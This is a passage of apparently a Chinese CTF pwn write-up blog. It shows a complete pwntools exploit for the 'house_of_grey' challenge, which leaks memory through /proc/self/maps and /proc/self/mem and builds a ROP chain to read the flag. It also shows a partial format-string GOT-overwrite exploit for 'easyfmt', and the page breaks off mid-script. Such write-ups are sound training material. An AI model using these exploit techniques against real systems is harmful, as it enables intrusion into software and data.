class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"><span class="comment"># Team  : D0g3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exeFile  = <span class="string">&quot;house_of_grey&quot;</span></span><br><span class="line">libFile  = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;111.198.29.45&quot;</span></span><br><span class="line">remotePort = <span class="number">44908</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIB   = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x :  io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">pd32  = <span class="keyword">lambda</span> x : p32(x).decode() <span class="comment">#python3 not surport str + bytes</span></span><br><span class="line">pd64  = <span class="keyword">lambda</span> x : p64(x).decode()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fid</span>(<span class="params">text</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;5.Exit\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loc</span>(<span class="params">offset</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;5.Exit\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">length</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;5.Exit\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(length))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">giv</span>(<span class="params">text</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;5.Exit\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>(<span class="params">text</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;5.Exit\n&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#leaking base addr</span></span><br><span class="line">	p = <span class="string">&#x27;/proc/self/maps&#x27;</span></span><br><span class="line">	fid(p)</span><br><span class="line">	get(<span class="number">1500</span>)</span><br><span class="line"></span><br><span class="line">	ru(<span class="string">&#x27;You get something:\n&#x27;</span>)</span><br><span class="line">	exe_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">	ru(<span class="string">&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">	stack_start = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">	ru(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">	stack_end =   <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">	ru(<span class="string">&#x27;rw-p 00000000 00:00 0 \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">	li(<span class="string">&#x27;exe_base  &#x27;</span> + <span class="built_in">hex</span>(exe_base))</span><br><span class="line">	li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">	li(<span class="string">&#x27;stack_start &#x27;</span> + <span class="built_in">hex</span>(stack_start))</span><br><span class="line">	li(<span class="string">&#x27;stack_end   &#x27;</span> + <span class="built_in">hex</span>(stack_end))</span><br><span class="line"></span><br><span class="line">	pop_rdi_ret_offset = <span class="number">0x1823</span></span><br><span class="line">	pop_rsi_r15_ret_offset = <span class="number">0x1821</span></span><br><span class="line">	pop_rdi_ret = exe_base + pop_rdi_ret_offset</span><br><span class="line">	pop_rsi_r15_ret = exe_base + pop_rsi_r15_ret_offset</span><br><span class="line">	open_plt = exe_base + exe.plt[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">	read_plt = exe_base + exe.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">	puts_plt = exe_base + exe.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">	<span class="comment">#position stack addr</span></span><br><span class="line">	offset = <span class="number">0xf800000</span></span><br><span class="line">	li(<span class="string">&#x27;debug---------------&#x27;</span>)</span><br><span class="line">	<span class="comment">#begin_offset ~ stack_end</span></span><br><span class="line">	stack_begin_offset = stack_end - offset - <span class="number">24</span> * <span class="number">100000</span></span><br><span class="line">	li(<span class="string">&#x27;stack_begin_offset &#x27;</span> + <span class="built_in">hex</span>(stack_begin_offset))</span><br><span class="line">	li(<span class="string">&#x27;stack_end   &#x27;</span> +        <span class="built_in">hex</span>(stack_end))</span><br><span class="line"></span><br><span class="line">	fid(<span class="string">&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">	loc(stack_begin_offset)</span><br><span class="line">	<span class="comment"># searching</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">24</span>):</span><br><span class="line">		get(<span class="number">100000</span>)</span><br><span class="line">		text = ru(<span class="string">&#x27;1.Find something&#x27;</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;/proc/self/mem&#x27;</span> <span class="keyword">in</span> text:</span><br><span class="line">			content = text.split(<span class="string">&#x27;/proc/self/mem&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> i == <span class="number">23</span>:</span><br><span class="line">			li(<span class="string">&#x27;not found&#x27;</span>)</span><br><span class="line">			exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	v8_addr = stack_begin_offset + i * <span class="number">100000</span> + <span class="built_in">len</span>(content) - <span class="number">0x14</span></span><br><span class="line">	li(<span class="string">&#x27;v8_addr: &#x27;</span> + <span class="built_in">hex</span>(v8_addr))</span><br><span class="line"></span><br><span class="line">	read_ret = v8_addr - (<span class="number">0x60</span> - <span class="number">0x08</span>) + <span class="number">0x20</span></span><br><span class="line">	li(<span class="string">&#x27;read_ret: &#x27;</span> + <span class="built_in">hex</span>(read_ret))</span><br><span class="line">	p = <span class="string">&#x27;/proc/self/mem&#x27;</span>.ljust(<span class="number">24</span>, <span class="string">&#x27;\x00&#x27;</span>) + p64(read_ret)</span><br><span class="line">	fid(p) <span class="comment"># fd as 5</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#rop</span></span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	3 RDX  0x28 #length</span></span><br><span class="line"><span class="string">	1 RDI  0x0  #fd</span></span><br><span class="line"><span class="string">	2 RSI  0x7fd5ffbc3640 ◂— &#x27;/proc/self/mem&#x27; #buffer</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">	ret = read_ret</span><br><span class="line">	<span class="comment">#open  ./flag</span></span><br><span class="line">	p = p64(pop_rdi_ret) + p64(ret + <span class="number">15</span> * <span class="number">8</span>)</span><br><span class="line">	p += p64(pop_rsi_r15_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(open_plt)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># read flag to buffer, fd is 6</span></span><br><span class="line">	p += p64(pop_rdi_ret) + p64(<span class="number">6</span>)</span><br><span class="line">	p += p64(pop_rsi_r15_ret) + p64(ret + <span class="number">15</span> * <span class="number">8</span>) + p64(<span class="number">0</span>) + p64(read_plt)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># puts flag</span></span><br><span class="line">	p += p64(pop_rdi_ret) + p64(ret + <span class="number">15</span> * <span class="number">8</span>) + p64(puts_plt)</span><br><span class="line">	<span class="comment"># ./flag str will be replace flag&#123;***&#125;</span></span><br><span class="line">	<span class="comment">#p = p64(pop_rdi_ret) + p64()</span></span><br><span class="line">	p += <span class="string">&#x27;./flag\x00&#x27;</span></span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	</span><br><span class="line">	giv(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/04/08/wp-house-of-grey/" data-id="ckhemv82t0033wdcm8duqdnww" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-easyfmt" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/07/wp-easyfmt/" class="article-date">
  <time datetime="2020-04-07T10:18:09.000Z" itemprop="datePublished">2020-04-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/07/wp-easyfmt/">wp easyfmt</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="easyfmt"><a href="#easyfmt" class="headerlink" title="easyfmt"></a>easyfmt</h1><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>攻防世界</p>
<h2 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome to haerbin~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)CheckIn() == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;slogan: &quot;</span>, <span class="number">9u</span>LL);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;buf, &amp;buf, argv); <span class="comment">//fmt vul</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;bye~&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);                                      <span class="comment">// modify this</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这是一个有概率的题,需要多打几次, 概率绕过第一个后, 通过fmt漏洞修改exit的got表实现循环利用,然后泄漏__libc_start_main获取libc基址, 获取system地址后, 然后再partial write修改printf的got为system地址</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"><span class="comment"># Team  : D0g3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exeFile  = <span class="string">&quot;easyfmt&quot;</span></span><br><span class="line">libFile  = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;111.198.29.45&quot;</span></span><br><span class="line">remotePort = <span class="number">53453</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIB   = <span class="number">0</span></span><br><span class="line"><span class="comment">#  ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">pd32  = <span class="keyword">lambda</span> x : p32(x).decode() <span class="comment">#python3 not surport str + bytes</span></span><br><span class="line">pd64  = <span class="keyword">lambda</span> x : p64(x).decode()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">prev, word, index</span>):</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(rl())</span><br><span class="line">	p = <span class="string">&#x27;\x31&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span> * <span class="number">9</span></span><br><span class="line">	s(p)</span><br><span class="line">	ru(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">	offset = <span class="number">10</span></span><br><span class="line">	start_addr = <span class="number">0x400750</span></span><br><span class="line">	exit_got   = exe.got[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">	exit_plt   = <span class="number">0x400720</span></span><br><span class="line">	fmt_addr = <span class="number">0x400982</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#leaking libc	</span></span><br><span class="line">	fini_array = <span class="number">0x400a74</span></span><br><span class="line">	<span class="comment">#modify exit got as fmt_start</span></span><br><span class="line">	<span class="comment">#can&#x27;t set addr at front</span></span><br><span class="line">	p = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(fmt_addr &amp; <span class="number">0xFFFF</span>) + <span class="string">&#x27;c%10$hn&#x27;</span> + <span class="string">&#x27;A&#x27;</span> * <span class="number">4</span> + p64(exit_got)</span><br><span class="line">	li(<span class="string">&#x27;exit_got: &#x27;</span> + <span class="built_in">hex</span>(exit_got))</span><br><span class="line">	s(p)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#leaking libc</span></span><br><span class="line">	ru(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">	p = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">44</span>) +<span class="string">&#x27;$p&#x27;</span></span><br><span class="line">	s(p)</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	__libc_start_main = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, __libc_start_main)</span><br><span class="line">	libc_base = __libc_start_main - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">	sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">	sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">	printf_addr = libc_base + libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#log</span></span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	li(<span class="string">&#x27;printf_got: &#x27;</span> + <span class="built_in">hex</span>(exe.got[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">	li(<span class="string">&#x27;system_addr: &#x27;</span> + <span class="built_in">hex</span>(sys_addr))</span><br><span class="line">	li(<span class="string">&#x27;printf_addr: &#x27;</span> + <span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line">	li(<span 